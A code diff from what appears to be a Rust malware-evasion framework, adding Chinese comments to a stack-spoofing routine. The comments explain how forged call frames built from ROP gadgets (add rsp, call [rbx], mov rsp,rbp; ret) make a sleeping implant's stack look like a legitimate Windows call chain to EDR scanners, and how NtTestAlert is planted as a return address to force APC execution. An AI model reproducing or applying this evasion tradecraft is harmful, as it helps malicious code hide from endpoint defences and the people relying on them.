@@ -291,8 +291,12 @@ impl StackSpoof {
 
 
 
-/// Applies a fake call stack layout to a series of thread contexts:在物理内存中,把当前线程上下文(CONTEXT)强行改造成一条连贯的,无破绽的系统合法调用链(ROP)
+/// Applies a fake call stack layout to a series of thread contexts:在物理内存中,把当前线程上下文(CONTEXT)强行改造成一条连贯的,无破绽的系统合法调用链(ROP).
+/// 
     /// simulating a legitimate execution.
+    /// 
+    /// 1. 在栈上通过物理写入真实的系统函数返回地址,捏造一个合法连贯的假调用链(RtlUserThreadStart ➔ BaseThreadInitThunk ➔ EnumDateFormatsExA)给edr的扫描器看
+    /// 2. 通过计算偏移,利用add rsp和call [rbx]这两个ROP零件,把这些假的栈帧串联起来.当定时器触发时,cpu顺着这条链安全的执行“修改保护属性 ➔ 解密 ➔ 还原环境”的全部动作.在hypnus.rs的ctx[5],主线程上下文被强行修改,rip指向WaitForSingleObject时.在WaitForSingleObject休眠阶段,运行时对应ctx[5].此时edr去挂起该线程检查它的堆栈.看到的是ZwWaitForWork → RtlAcquireSRWLock → BaseThreadInitThunk
 pub fn spoof(&self,ctxs:&mut [CONTEXT],cfg:&&Config,kind:Obfuscation)->Result<()> {
     
 // 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
@@ -322,14 +326,16 @@ pub fn spoof(&self,ctxs:&mut [CONTEXT],cfg:&&Config,kind:Obfuscation)->Result<()
 unsafe {
 // 当当前线程混淆结束,引导程序回到真实的执行流:
     for ctx in ctxs.iter_mut() {
+
+        // 
         ctx.Rbp=match kind {
 
-            // 
+            // rsp赋给rbp:在gadget.rs中,向内存页写入了bytes()返回的收尾opcode :mov rsp,rbp; ret
+            // 在rsp向下拉进行伪造之前,把当前真实的rsp写入rbp.cpu顺着伪造的rop链执行到最后一步,cpu跳转到收尾opcode执行.此时,rsp跳过中间所有的伪造栈帧和20k的gap,回到最开始的真实栈顶位置
             Obfuscation::Timer | Obfuscation::Wait=>ctx.Rsp,
-// 
+// win中,在一个线程中插入APC后,该apc并不立即执行,只有当这个线程进入警惕状态Alertable State时,内核才会派发并执行apc队列中任务.NtTestAlert就是这个强制叫醒去检查并执行用户态apc的
 Obfuscation::Foliage=>{
     // Inject NtTestAlert as stack return address to trigger APC delivery
-
     (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
                         ctx.Rsp
 }
